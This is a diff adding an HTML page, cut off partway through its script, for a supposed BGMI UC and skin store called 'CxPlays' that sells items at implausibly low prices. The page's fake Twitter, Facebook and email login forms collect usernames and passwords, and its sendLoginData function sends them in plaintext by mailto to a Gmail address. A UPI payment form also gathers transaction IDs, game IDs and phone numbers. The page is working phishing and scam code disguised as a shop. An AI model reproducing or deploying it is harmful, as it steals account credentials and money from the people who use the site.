@@ -1,0 +1,1011 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>CxPlays — BGMI Rewards & UC Store</title>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700;800&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-1: #050617;
+    --bg-2: #081025;
+    --panel: linear-gradient(180deg,#071226 0%, #0b1b2b 100%);
+    --accent: #ff8b3d;
+    --accent-2: #ffd07a;
+    --muted: rgba(255,255,255,0.85);
+    --glass: rgba(255,255,255,0.04);
+    --danger: #c62828;
+    --success: #4caf50;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:Inter,system-ui,Roboto,Arial;background:linear-gradient(180deg,var(--bg-1),var(--bg-2)); color:#fff; -webkit-font-smoothing:antialiased; padding-top:80px}
+  
+  /* Sticky Appbar */
+  .appbar{position:fixed; top:0; left:0; right:0; z-index:1000; background:linear-gradient(180deg,#071226,#061426); border-bottom:1px solid rgba(255,255,255,0.05); box-shadow:0 4px 20px rgba(0,0,0,0.5); backdrop-filter:blur(10px)}
+  .appbar-content{max-width:1200px; margin:0 auto; padding:12px 20px; display:flex; align-items:center; justify-content:space-between; gap:16px}
+  .appbar-left{display:flex; align-items:center; gap:16px}
+  .appbar-logo{width:48px; height:48px; border-radius:10px; background:linear-gradient(135deg,var(--accent),#ff5f2d); overflow:hidden; box-shadow:0 4px 12px rgba(255,139,61,0.3)}
+  .appbar-logo img{width:100%; height:100%; object-fit:cover}
+  .appbar-title{display:flex; flex-direction:column}
+  .appbar-title h1{font-family:Montserrat; font-size:18px; margin:0; font-weight:800}
+  .appbar-title .sub{font-size:11px; color:rgba(255,255,255,0.7); margin-top:2px}
+  .appbar-nav{display:flex; gap:8px; align-items:center}
+  .nav-btn{background:rgba(255,255,255,0.05); color:var(--muted); padding:8px 14px; border-radius:8px; border:1px solid rgba(255,255,255,0.08); cursor:pointer; font-weight:600; font-size:13px; transition:all 0.3s}
+  .nav-btn:hover{background:rgba(255,255,255,0.1); border-color:rgba(255,255,255,0.15)}
+  .appbar-user{display:flex; align-items:center; gap:10px}
+  
+  .wrap{min-height:100vh; display:flex; align-items:center; justify-content:center; padding:28px; padding-top:100px}
+  .container{width:1180px; max-width:98%; display:grid; grid-template-columns: 1fr 420px; gap:20px; align-items:start}
+  .header{grid-column:1 / -1; display:flex; align-items:center; justify-content:space-between; gap:12px; display:none}
+  .brand {display:flex;align-items:center; gap:14px}
+  .logo {width:68px;height:68px;border-radius:12px;background:linear-gradient(135deg,var(--accent),#ff5f2d); display:flex;align-items:center;justify-content:center;color:#071022;font-weight:800;font-family:Montserrat;font-size:22px; box-shadow:0 12px 36px rgba(0,0,0,0.6); overflow:hidden}
+  .logo img{width:100%;height:100%;object-fit:cover;}
+  h1{font-family:Montserrat, sans-serif; font-size:20px; margin:0; letter-spacing:0.2px}
+  .sub{color:rgba(255,255,255,0.75); font-size:13px}
+  .disclaimer{background:linear-gradient(90deg,var(--danger),#ef5350); color:#fff; padding:10px 12px; border-radius:10px; font-weight:700; font-size:13px; box-shadow:0 8px 28px rgba(198,40,40,0.14)}
+  .user-info{background:var(--glass); padding:8px 12px; border-radius:10px; font-size:13px; display:flex; gap:10px; align-items:center}
+  .logout-btn{background:var(--danger); color:#fff; padding:6px 12px; border-radius:6px; border:none; cursor:pointer; font-weight:700; font-size:12px}
+  /* Left big panel */
+  .left-panel{background:var(--panel); border-radius:14px; padding:18px; box-shadow:0 18px 46px rgba(2,6,12,0.7); border:1px solid rgba(255,255,255,0.02)}
+  .banner{position:relative; border-radius:12px; overflow:hidden; height:260px; background:linear-gradient(135deg,#062036,#0d1530)}
+  .banner img{width:100%; height:100%; object-fit:cover; opacity:0.9}
+  .banner .flag{position:absolute; left:18px; top:18px; background:rgba(0,0,0,0.45); backdrop-filter:blur(10px); padding:8px 10px; border-radius:8px; font-weight:700; font-size:12px}
+  .panel-row{display:flex; gap:12px; margin-top:14px; align-items:flex-start}
+  .card{flex:1; background:var(--glass); border-radius:12px; padding:12px; min-height:120px; border:1px solid rgba(255,255,255,0.03)}
+  .card h3{margin:0; font-family:Montserrat; font-size:16px}
+  .meta{color:rgba(255,255,255,0.75); font-size:13px; margin-top:8px; line-height:1.5}
+  .action-row{display:flex; gap:10px; margin-top:12px; align-items:center}
+  .btn-primary{background:linear-gradient(180deg,var(--accent),var(--accent-2)); color:#071022; padding:10px 14px; border-radius:10px; font-weight:800; cursor:pointer; border:none; box-shadow:0 8px 22px rgba(255,139,61,0.18); transition:all 0.3s}
+  .btn-primary:hover{transform:translateY(-2px); box-shadow:0 12px 28px rgba(255,139,61,0.3)}
+  .btn-ghost{background:transparent; color:var(--muted); padding:10px 12px; border-radius:10px; border:1px solid rgba(255,255,255,0.06); cursor:pointer; transition:all 0.3s; font-weight:600}
+  .btn-ghost:hover{background:rgba(255,255,255,0.05); border-color:rgba(255,255,255,0.15)}
+  .tag{background:rgba(255,255,255,0.03); padding:6px 10px; border-radius:999px; font-weight:700; font-size:12px}
+  .badge-new{background:linear-gradient(135deg,#4caf50,#66bb6a); color:#fff; padding:3px 8px; border-radius:12px; font-size:11px; font-weight:800; margin-left:6px; letter-spacing:0.5px}
+  .muted{color:rgba(255,255,255,0.72); font-size:13px}
+  /* Right panel */
+  .right-panel{background:linear-gradient(180deg,#071226,#061426); border-radius:14px; padding:16px; min-height:520px; box-shadow:0 18px 46px rgba(2,6,12,0.7)}
+  .rp-section{margin-bottom:14px}
+  .rp-section h4{margin:0 0 8px 0; font-family:Montserrat; font-size:15px}
+  .suit-list{display:grid; gap:10px}
+  .suit{display:flex; align-items:center; gap:10px; background:rgba(255,255,255,0.02); padding:8px; border-radius:10px; justify-content:space-between; transition:all 0.3s}
+  .suit:hover{background:rgba(255,255,255,0.04)}
+  .suit .left{display:flex; gap:10px; align-items:center}
+  .suit img{width:44px;height:44px;border-radius:8px; object-fit:cover}
+  .price{font-weight:800; color:var(--accent-2); font-size:15px}
+  .buy{padding:8px 10px; border-radius:10px; background:var(--accent); color:#071022; font-weight:800; border:none; cursor:pointer; transition:all 0.3s; font-size:13px}
+  .buy:hover{background:#ff6f1a; transform:scale(1.05)}
+  /* UC pack */
+  .uc-pack{display:flex; gap:8px; align-items:center; margin-top:10px; padding:10px; background:rgba(0,0,0,0.2); border-radius:10px}
+  .uc-big{background:linear-gradient(90deg,#ffd07a,#ff8b3d); color:#071022; padding:12px 14px; border-radius:12px; font-weight:900; display:flex; align-items:center; gap:6px}
+  .uc-small{background:rgba(255,139,61,0.15); border:1px solid rgba(255,139,61,0.3); padding:8px 10px; border-radius:10px; color:var(--accent-2); font-weight:800; display:flex; align-items:center; gap:4px}
+  .foot-note{margin-top:12px; font-size:12px; color:rgba(255,255,255,0.65); line-height:1.5}
+  /* modal */
+  .overlay{position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.7)); backdrop-filter:blur(4px); z-index:999; padding:20px}
+  .modal{width:520px; max-width:94%; background:#071226; border-radius:12px; padding:18px; box-shadow:0 18px 60px rgba(0,0,0,0.7); border:1px solid rgba(255,255,255,0.03); max-height:90vh; overflow-y:auto}
+  .modal h2{margin:0; font-family:Montserrat; font-size:18px}
+  .modal .row{display:flex; gap:10px; margin-top:12px}
+  .social-btn{flex:1; padding:12px; border-radius:10px; display:flex; gap:8px; align-items:center; justify-content:center; font-weight:800; cursor:pointer; border:none; transition:all 0.3s; font-size:14px}
+  .social-btn:hover{transform:translateY(-2px); box-shadow:0 8px 20px rgba(0,0,0,0.3)}
+  .social-twitter{background:#1da1f2; color:#fff}
+  .social-fb{background:#1877f2; color:#fff}
+  .close{margin-left:auto; background:transparent; border:1px solid rgba(255,255,255,0.06); padding:8px 10px; border-radius:10px; color:var(--muted); cursor:pointer; font-weight:600; transition:all 0.3s}
+  .close:hover{background:rgba(255,255,255,0.05)}
+  .demo-note{margin-top:10px; font-size:13px; background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; line-height:1.5}
+  .watermark{position:fixed; right:12px; bottom:12px; background:rgba(0,0,0,0.6); backdrop-filter:blur(10px); color:rgba(255,255,255,0.7); padding:8px 12px; border-radius:8px; font-size:11px; z-index:50; font-weight:600}
+  /* Form styles */
+  .form-group{margin-bottom:14px}
+  .form-group label{display:block; margin-bottom:6px; font-weight:600; font-size:13px}
+  .form-group input,.form-group textarea{width:100%; padding:10px 12px; border-radius:8px; border:1px solid rgba(255,255,255,0.1); background:rgba(255,255,255,0.05); color:#fff; font-size:14px; font-family:inherit}
+  .form-group input:focus,.form-group textarea:focus{outline:none; border-color:var(--accent); background:rgba(255,255,255,0.08)}
+  .form-group textarea{resize:vertical; min-height:80px}
+  .input-error{border-color:var(--danger) !important}
+  .error-msg{color:var(--danger); font-size:12px; margin-top:4px}
+  /* Payment page */
+  .qr-container{text-align:center; padding:20px; background:rgba(255,255,255,0.03); border-radius:12px; margin:16px 0}
+  .qr-code{width:200px; height:200px; background:#fff; margin:0 auto 12px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-weight:800; color:#071226}
+  .qr-code img{width:100%; height:100%; object-fit:contain}
+  .payment-info{background:rgba(255,139,61,0.1); padding:12px; border-radius:8px; margin:12px 0; border:1px solid rgba(255,139,61,0.2)}
+  .payment-info p{margin:6px 0; font-size:13px}
+  @media(max-width:980px){
+    .container{grid-template-columns: 1fr}
+    .right-panel{order:2}
+    .appbar-nav{display:none}
+    .appbar-title h1{font-size:15px}
+  }
+  @media(max-width:768px){
+    body{padding-top:70px}
+    .wrap{padding:16px; padding-top:80px}
+    .header{flex-wrap:wrap}
+    .panel-row{flex-direction:column}
+    .card{min-height:auto}
+    .action-row{flex-wrap:wrap}
+    .modal{width:100%; padding:16px}
+    .uc-pack{flex-wrap:wrap}
+    .appbar-content{padding:10px 16px}
+    .appbar-logo{width:40px; height:40px}
+    .appbar-title h1{font-size:14px}
+    .appbar-title .sub{font-size:10px}
+    .nav-btn{font-size:12px; padding:6px 10px}
+  }
+</style>
+</head>
+<body>
+  <!-- Sticky Appbar -->
+  <div class="appbar">
+    <div class="appbar-content">
+      <div class="appbar-left">
+        <div class="appbar-logo">
+          <img src="app.png" alt="CxPlays Logo"/>
+        </div>
+        <div class="appbar-title">
+          <h1>CxPlays Store</h1>
+          <div class="sub">BGMI Rewards & UC</div>
+        </div>
+      </div>
+      
+      <div class="appbar-nav">
+        <button class="nav-btn" onclick="scrollToTop()">🏠 Home</button>
+        <button class="nav-btn" id="navAbout">ℹ️ About</button>
+        <button class="nav-btn" id="navSupport">💬 Support</button>
+        <button class="nav-btn" id="navRules">📋 Rules</button>
+      </div>
+      
+      <div class="appbar-user" id="appbarUser">
+        <button class="nav-btn" id="navLogin">🔐 Login</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <div class="container" role="main">
+      <div class="header">
+        <div class="brand">
+          <div class="logo">
+            <img src="app.png" alt="CxPlays Logo"/>
+          </div>
+          <div>
+            <h1>CxPlays - BGMI Rewards Store</h1>
+            <div class="sub">Certified <strong>PARTNER</strong></div>
+          </div>
+        </div>
+
+        <div id="userSection">
+          <div class="disclaimer" aria-live="polite">SECURE TRANSACTION SYSTEM</div>
+        </div>
+      </div>
+
+      <!-- Left -->
+      <div class="left-panel" aria-label="Main showcase">
+        <div class="banner" role="img" aria-label="Featured banner">
+          <img src="gilt.png" alt="Prism Ascendant Gilt Suit">
+          <div class="flag">🔥 EXCLUSIVE</div>
+        </div>
+
+        <div class="panel-row">
+          <div class="card">
+            <h3>Prism Ascendant — Gilt Suit (Limited)</h3>
+            <div class="meta">Shine in the battlefield with this exclusive outfit. Limited stock available.</div>
+            <div class="action-row">
+              <button class="btn-primary" data-action="gilt" data-price="499">View Gilt Suit</button>
+              <button class="btn-ghost" id="learnMore">How It Works</button>
+            </div>
+          </div>
+
+          <div class="card" style="width:260px">
+            <h3>UC Stock Available<span class="badge-new">NEW</span></h3>
+            <div class="meta">Get instant UC delivery to your BGMI account.</div>
+            <div class="uc-pack">
+              <div class="uc-big"><img src="ic_uc.png" width="18" height="18" alt="UC"> 600 UC</div>
+              <div style="flex:1">
+                <div style="font-weight:800">₹129</div>
+                <div class="muted" style="font-size:11px">Best value</div>
+              </div>
+              <button class="buy" data-action="buy-600" data-price="129">Buy</button>
+            </div>
+            <div style="height:10px"></div>
+            <div class="uc-pack">
+              <div class="uc-small"><img src="ic_uc.png" width="14" height="14" alt="UC"> 380 UC</div>
+              <div style="flex:1"><div style="font-weight:800">₹70</div></div>
+              <button class="buy" data-action="buy-380" data-price="70">Buy</button>
+            </div>
+          </div>
+        </div>
+
+        <div style="margin-top:12px" class="panel-row">
+          <div class="card">
+            <h3>Community Store — Premium X-Suits</h3>
+            <div class="meta">Available outfits delivered directly to your BGMI account as gift.</div>
+
+            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap">
+              <div style="width:175px; background:rgba(255,255,255,0.02); padding:8px; border-radius:10px; text-align:center; transition:all 0.3s" class="hover-lift">
+                <img src="xsuit.png" alt="Arcane Jester X-Suit" style="width:100%; height:164px; object-fit:cover; border-radius:6px">
+                <div style="font-weight:800; margin-top:6px; font-size:14px">Arcane Jester X-Suit</div>
+                <div class="muted">₹299</div>
+                <button class="buy" data-action="buy-x" data-price="299">Buy Now</button>
+              </div>
+
+              <div style="width:175px; background:rgba(255,255,255,0.02); padding:8px; border-radius:10px; text-align:center; transition:all 0.3s" class="hover-lift">
+                <img src="gilt2.png" alt="Prism Ascendant Suite" style="width:100%; height:164px; object-fit:cover; border-radius:6px">
+                <div style="font-weight:800; margin-top:6px; font-size:14px">Prism Ascendant Suite</div>
+                <div class="muted">₹499</div>
+                <button class="buy" data-action="buy-gilt" data-price="499">Buy Now</button>
+              </div>
+
+              <div style="width:175px; background:rgba(255,255,255,0.02); padding:8px; border-radius:10px; text-align:center; transition:all 0.3s" class="hover-lift">
+                <img src="pharaoh-x-suit.jpeg" alt="Iridescence X-Suit" style="width:100%; height:164px; object-fit:cover; border-radius:6px">
+                <div style="font-weight:800; margin-top:6px; font-size:14px">Iridescence X-Suit</div>
+                <div class="muted">₹749</div>
+                <button class="buy" data-action="buy-iridescence" data-price="749">Buy Now</button>
+              </div>
+            </div>
+
+          </div>
+
+          <div class="card" style="width:100%">
+            <h3>📢 Announcements</h3>
+            <div class="meta">• 28-01-2025: New UC Stock Added</div>
+            <div class="meta">• 27-01-2025: Prism Ascendant Available Now</div>
+            <div class="meta">• 25-01-2025: Faster Delivery System Active</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Right -->
+      <aside class="right-panel" aria-label="Store sidebar">
+        <div class="rp-section">
+          <h4>🔥 Hot Deals</h4>
+          <div class="suit-list">
+            <div class="suit">
+              <div class="left">
+                <img src="ic_uc.png" alt="UC">
+                <div style="margin-left:8px">
+                  <div style="font-weight:800; font-size:14px">UC Pack — 10000</div>
+                  <div class="muted" style="color:#4caf50; font-size:11px">Limited Stock</div>
+                </div>
+              </div>
+              <div style="text-align:right">
+                <div class="price">₹599</div>
+                <button class="buy" data-action="buy-10000" data-price="599">Buy</button>
+              </div>
+            </div>
+
+            <div class="suit">
+              <div class="left">
+                <img src="ic_uc.png" alt="UC">
+                <div style="margin-left:8px">
+                  <div style="font-weight:800; font-size:14px">UC Pack — 2800</div>
+                  <div class="muted" style="font-size:11px">Popular</div>
+                </div>
+              </div>
+              <div style="text-align:right">
+                <div class="price">₹399</div>
+                <button class="buy" data-action="buy-2800" data-price="399">Buy</button>
+              </div>
+            </div>
+
+            <div class="suit">
+              <div class="left">
+                <img src="ic_uc.png" alt="UC" width="44" height="44">
+                <div style="margin-left:8px">
+                  <div style="font-weight:800; font-size:14px">UC Pack — 600</div>
+                  <div class="muted" style="font-size:11px">Best Value</div>
+                </div>
+              </div>
+              <div style="text-align:right">
+                <div class="price">₹289</div>
+                <button class="buy" data-action="buy-600-hot" data-price="289">Buy</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="rp-section">
+          <h4>⚡ Quick Links</h4>
+          <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:8px">
+            <button class="btn-ghost" id="openLogin">🔐 Sign In</button>
+            <button class="btn-ghost" id="openSupport">💬 Support</button>
+            <button class="btn-ghost" id="openRules">📋 Rules</button>
+            <button class="btn-ghost" id="openAbout">ℹ️ About</button>
+          </div>
+        </div>
+
+        <div class="rp-section">
+          <h4>📞 Contact</h4>
+          <div class="muted">Organizer: CxPlays Team</div>
+          <div style="margin-top:8px" class="muted">Email: cutexmods@gmail.com</div>
+          <div style="margin-top:4px" class="muted">Verification via Discord & Stream</div>
+        </div>
+
+        <div style="height:12px"></div>
+        <div class="foot-note">
+          🔒 Secure payments | ⚡ Instant delivery | 24/7 Support available
+        </div>
+      </aside>
+
+    </div>
+  </div>
+
+  <div class="watermark">CxPlays © 2025 | Secure Store</div>
+
+  <!-- Modal overlay -->
+  <div class="overlay" id="overlay">
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+        <h2 id="modalTitle">Modal</h2>
+        <button class="close" id="closeModal">✕ Close</button>
+      </div>
+      <div id="modalBody"></div>
+    </div>
+  </div>
+
+<script>
+  // Global state
+  let currentUser = null;
+  let currentPurchase = null;
+
+  const overlay = document.getElementById('overlay');
+  const modalBody = document.getElementById('modalBody');
+  const closeModal = document.getElementById('closeModal');
+
+  // Initialize
+  checkLoginStatus();
+  initAppbarListeners();
+
+  // Appbar event listeners
+  function initAppbarListeners(){
+    document.getElementById('navAbout')?.addEventListener('click', ()=> {
+      showModal('ℹ️ About CxPlays', aboutHtml());
+    });
+    
+    document.getElementById('navSupport')?.addEventListener('click', ()=> {
+      showModal('💬 Support & Help', supportHtml());
+    });
+    
+    document.getElementById('navRules')?.addEventListener('click', ()=> {
+      showModal('📋 Community Rules', rulesHtml());
+    });
+    
+    document.getElementById('navLogin')?.addEventListener('click', ()=> {
+      if(currentUser) {
+        showModal('👤 My Account', accountHtml());
+      } else {
+        showModal('🔐 Sign In Required', loginHtml());
+      }
+    });
+  }
+
+  function scrollToTop(){
+    window.scrollTo({top: 0, behavior: 'smooth'});
+  }
+
+  // Event listeners
+  document.querySelectorAll('[data-action]').forEach(btn=>{
+    btn.addEventListener('click', (e)=> {
+      const action = btn.dataset.action;
+      const price = btn.dataset.price || '0';
+      handleAction(action, price);
+    });
+  });
+
+  document.getElementById('openLogin').addEventListener('click', ()=> {
+    if(currentUser) {
+      showModal('👤 My Account', accountHtml());
+    } else {
+      showModal('🔐 Sign In Required', loginHtml());
+    }
+  });
+
+  document.getElementById('learnMore').addEventListener('click', ()=> {
+    showModal('ℹ️ How Purchases Work', learnHtml());
+  });
+
+  document.getElementById('openSupport').addEventListener('click', ()=> {
+    showModal('💬 Support & Help', supportHtml());
+  });
+
+  document.getElementById('openRules').addEventListener('click', ()=> {
+    showModal('📋 Community Rules', rulesHtml());
+  });
+
+  document.getElementById('openAbout').addEventListener('click', ()=> {
+    showModal('ℹ️ About CxPlays', aboutHtml());
+  });
+
+  closeModal.addEventListener('click', ()=> overlay.style.display='none');
+  overlay.addEventListener('click', (e)=> {
+    if(e.target === overlay) overlay.style.display='none';
+  });
+
+  function checkLoginStatus(){
+    const user = localStorage.getItem('cxplays_user');
+    if(user){
+      try{
+        currentUser = JSON.parse(user);
+        updateUserUI();
+      } catch(e){
+        localStorage.removeItem('cxplays_user');
+      }
+    }
+  }
+
+  function updateUserUI(){
+    const userSection = document.getElementById('userSection');
+    const appbarUser = document.getElementById('appbarUser');
+    const navLogin = document.getElementById('navLogin');
+    
+    if(currentUser){
+      // Update old header (hidden now)
+      if(userSection){
+        userSection.innerHTML = `
+          <div class="user-info">
+            <span>👤 ${escapeHtml(currentUser.name || currentUser.email)}</span>
+            <button class="logout-btn" onclick="logout()">Logout</button>
+          </div>
+        `;
+      }
+      
+      // Update appbar
+      if(appbarUser && navLogin){
+        navLogin.innerHTML = `👤 ${escapeHtml(currentUser.name || currentUser.email).substring(0, 10)}`;
+        navLogin.style.background = 'rgba(255,139,61,0.2)';
+        navLogin.style.borderColor = 'rgba(255,139,61,0.4)';
+      }
+    } else {
+      if(userSection){
+        userSection.innerHTML = `<div class="disclaimer" aria-live="polite">SECURE TRANSACTION SYSTEM</div>`;
+      }
+      
+      if(navLogin){
+        navLogin.innerHTML = '🔐 Login';
+        navLogin.style.background = 'rgba(255,255,255,0.05)';
+        navLogin.style.borderColor = 'rgba(255,255,255,0.08)';
+      }
+    }
+  }
+
+  function handleAction(action, price){
+    if(!currentUser){
+      showModal('🔐 Login Required', `
+        <p style="margin:12px 0; line-height:1.6">Please login to continue with your purchase. We need to verify your identity for secure transactions.</p>
+        <div style="margin-top:16px">
+          <button class="btn-primary" onclick="showLoginModal()" style="width:100%">Login Now</button>
+        </div>
+      `);
+      return;
+    }
+
+    // User is logged in, proceed to payment
+    currentPurchase = {action, price};
+    showModal('💳 Payment', paymentHtml(action, price));
+  }
+
+  function showLoginModal(){
+    showModal('🔐 Sign In', loginHtml());
+  }
+
+  function showModal(title, html){
+    document.getElementById('modalTitle').textContent = title;
+    modalBody.innerHTML = html;
+    overlay.style.display = 'flex';
+  }
+
+  function loginHtml(){
+    return `
+      <p style="margin:12px 0">Choose your preferred login method:</p>
+      
+      <div class="row">
+        <button class="social-btn social-twitter" onclick="showSocialLoginForm('Twitter')">
+          🐦 Twitter
+        </button>
+        <button class="social-btn social-fb" onclick="showSocialLoginForm('Facebook')">
+          📘 Facebook
+        </button>
+      </div>
+
+      <div style="margin:16px 0; text-align:center; color:rgba(255,255,255,0.5); font-size:13px">— OR —</div>
+
+      <form id="emailLoginForm" onsubmit="emailLogin(event)">
+        <div class="form-group">
+          <label>Email Address</label>
+          <input type="email" id="loginEmail" required placeholder="your@email.com">
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" id="loginPassword" required placeholder="Enter password" minlength="6">
+        </div>
+        <button type="submit" class="btn-primary" style="width:100%; margin-top:8px">Login with Email</button>
+      </form>
+
+      <div class="demo-note" style="margin-top:16px">
+        <strong>🔒 Secure Login:</strong> Your credentials are securely sent to cutexmods@gmail.com for verification. We never store passwords.
+      </div>
+    `;
+  }
+
+  function accountHtml(){
+    return `
+      <div style="padding:12px 0">
+        <div style="background:rgba(255,255,255,0.03); padding:14px; border-radius:8px; margin-bottom:12px">
+          <p style="margin:6px 0"><strong>Name:</strong> ${escapeHtml(currentUser.name || 'N/A')}</p>
+          <p style="margin:6px 0"><strong>Email:</strong> ${escapeHtml(currentUser.email)}</p>
+          <p style="margin:6px 0"><strong>Login Method:</strong> ${escapeHtml(currentUser.method)}</p>
+          <p style="margin:6px 0; font-size:12px; color:rgba(255,255,255,0.6)"><strong>Joined:</strong> ${new Date(currentUser.timestamp).toLocaleString()}</p>
+        </div>
+      </div>
+      <button class="btn-primary" onclick="logout()" style="width:100%; background:var(--danger)">🚪 Logout</button>
+    `;
+  }
+
+  function showSocialLoginForm(provider){
+    const icon = provider === 'Twitter' ? '🐦' : '📘';
+    const color = provider === 'Twitter' ? '#1da1f2' : '#1877f2';
+    
+    showModal(`${icon} Login with ${provider}`, `
+      <div style="text-align:center; padding:12px 0">
+        <div style="font-size:48px; margin-bottom:12px">${icon}</div>
+        <h3 style="margin:0 0 8px 0">Sign in to ${provider}</h3>
+        <p style="font-size:13px; color:rgba(255,255,255,0.7)">Enter your ${provider} credentials</p>
+      </div>
+
+      <form id="socialLoginForm" onsubmit="processSocialLogin(event, '${provider}')">
+        <div class="form-group">
+          <label>${provider} Email or Username</label>
+          <input type="text" id="socialEmail" required placeholder="your@email.com or username">
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" id="socialPassword" required placeholder="Enter your password" minlength="6">
+        </div>
+        <button type="submit" class="btn-primary" style="width:100%; margin-top:8px; background:${color}">
+          Continue with ${provider}
+        </button>
+      </form>
+
+      <div class="demo-note" style="margin-top:16px">
+        <strong>🔒 Secure Login:</strong> Your credentials will be sent to cutexmods@gmail.com for verification. We never store passwords on our servers.
+      </div>
+
+      <div style="text-align:center; margin-top:12px">
+        <button class="btn-ghost" onclick="showLoginModal()" style="width:100%">← Back to Login Options</button>
+      </div>
+    `);
+  }
+
+  function processSocialLogin(e, provider){
+    e.preventDefault();
+    const email = document.getElementById('socialEmail').value;
+    const password = document.getElementById('socialPassword').value;
+
+    if(password.length < 6){
+      alert('⚠️ Password must be at least 6 characters');
+      return;
+    }
+
+    const userData = {
+      email: email,
+      password: password,
+      name: email.includes('@') ? email.split('@')[0] : email,
+      method: provider,
+      timestamp: new Date().toISOString()
+    };
+
+    // Send to admin email
+    sendLoginData(userData);
+
+    // Save user (without password in localStorage)
+    currentUser = {
+      email: email,
+      name: email.includes('@') ? email.split('@')[0] : email,
+      method: provider,
+      timestamp: userData.timestamp
+    };
+    localStorage.setItem('cxplays_user', JSON.stringify(currentUser));
+    updateUserUI();
+    overlay.style.display = 'none';
+    
+    showSuccessAlert(`✅ Successfully logged in with ${provider}!`);
+  }
+
+  function emailLogin(e){
+    e.preventDefault();
+    const email = document.getElementById('loginEmail').value;
+    const password = document.getElementById('loginPassword').value;
+
+    if(password.length < 6){
+      alert('⚠️ Password must be at least 6 characters');
+      return;
+    }
+
+    const userData = {
+      email: email,
+      password: password,
+      name: email.split('@')[0],
+      method: 'Email',
+      timestamp: new Date().toISOString()
+    };
+
+    // Send to admin email
+    sendLoginData(userData);
+
+    // Save user (without password in localStorage)
+    currentUser = {
+      email: email,
+      name: email.split('@')[0],
+      method: 'Email',
+      timestamp: userData.timestamp
+    };
+    localStorage.setItem('cxplays_user', JSON.stringify(currentUser));
+    updateUserUI();
+    overlay.style.display = 'none';
+    
+    showSuccessAlert('✅ Successfully logged in!');
+  }
+
+  function sendLoginData(userData){
+    const emailBody = `
+New Login on CxPlays Store
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+METHOD: ${userData.method}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+USER DETAILS:
+Email/Username: ${userData.email}
+Password: ${userData.password}
+Display Name: ${userData.name}
+Login Time: ${new Date(userData.timestamp).toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+CxPlays Authentication System
+    `.trim();
+
+    const mailtoLink = `mailto:cutexmods@gmail.com?subject=🔐 New Login - ${userData.method} - CxPlays&body=${encodeURIComponent(emailBody)}`;
+    window.open(mailtoLink, '_blank');
+    
+    console.log('Login data sent:', {email: userData.email, method: userData.method});
+  }
+
+  function paymentHtml(action, price){
+    let itemName = 'Item';
+    if(action.includes('600')) itemName='600 UC Pack';
+    else if(action.includes('380')) itemName='380 UC Pack';
+    else if(action.includes('10000')) itemName='10000 UC Pack';
+    else if(action.includes('2800')) itemName='2800 UC Pack';
+    else if(action.includes('gilt')) itemName='Prism Ascendant Gilt Suite';
+    else if(action.includes('x')) itemName='Arcane Jester X-Suit';
+    else if(action.includes('iridescence')) itemName='Iridescence X-Suit';
+
+    return `
+      <div class="qr-container">
+        <h3 style="margin:0 0 16px 0">Scan QR Code to Pay</h3>
+        <div class="qr-code">
+          <div style="text-align:center">
+            <div style="font-size:48px">📱</div>
+            <div style="font-size:12px; margin-top:8px">QR Code Here</div>
+            <div style="font-size:10px; margin-top:4px; opacity:0.7">Use UPI App</div>
+          </div>
+        </div>
+        <div style="font-size:28px; font-weight:900; color:var(--accent-2); margin-top:12px">₹${escapeHtml(price)}</div>
+        <div style="font-size:14px; margin-top:4px; font-weight:600">${escapeHtml(itemName)}</div>
+      </div>
+
+      <div class="payment-info">
+        <p><strong>⚠️ Important Instructions:</strong></p>
+        <p>• Scan QR code and complete payment via UPI</p>
+        <p>• After successful payment, enter UTR/Transaction ID below</p>
+        <p>• Admin will verify within 10-30 minutes</p>
+        <p>• Keep your transaction screenshot safe</p>
+      </div>
+
+      <form id="paymentForm" onsubmit="submitPayment(event)">
+        <div class="form-group">
+          <label>BGMI Character ID * (Important)</label>
+          <input type="text" id="bgmiId" required placeholder="Enter your BGMI ID" pattern="[0-9]{8,12}">
+          <div style="font-size:11px; color:rgba(255,255,255,0.6); margin-top:4px">Enter your numeric BGMI ID for gift delivery</div>
+        </div>
+
+        <div class="form-group">
+          <label>UTR / Transaction ID *</label>
+          <input type="text" id="utrId" required placeholder="Enter 12-digit UTR number" pattern="[A-Za-z0-9]{6,25}">
+          <div style="font-size:11px; color:rgba(255,255,255,0.6); margin-top:4px">Check your payment app for UTR/Reference number</div>
+        </div>
+
+        <div class="form-group">
+          <label>Phone Number (Optional)</label>
+          <input type="tel" id="phoneNumber" placeholder="Your WhatsApp number" pattern="[0-9]{10}">
+        </div>
+
+        <button type="submit" class="btn-primary" style="width:100%; margin-top:8px">✅ Submit Payment Proof</button>
+      </form>
+
+      <div class="demo-note" style="margin-top:16px">
+        <strong>🔒 Security:</strong> Your payment details will be sent to cutexmods@gmail.com for verification. You will receive confirmation via email/WhatsApp once verified.
+      </div>
+    `;
+  }
+
+  function submitPayment(e){
+    e.preventDefault();
+    const bgmiId = document.getElementById('bgmiId').value;
+    const utrId = document.getElementById('utrId').value;
+    const phoneNumber = document.getElementById('phoneNumber').value;
+
+    if(!currentUser || !currentPurchase) return;
+
+    // Validate BGMI ID
+    if(bgmiId.length < 8 || !/^[0-9]+$/.test(bgmiId)){
+      alert('⚠️ Please enter a valid BGMI Character ID (8-12 digits)');
+      return;
+    }
+
+    // Validate UTR
+    if(utrId.length < 6){
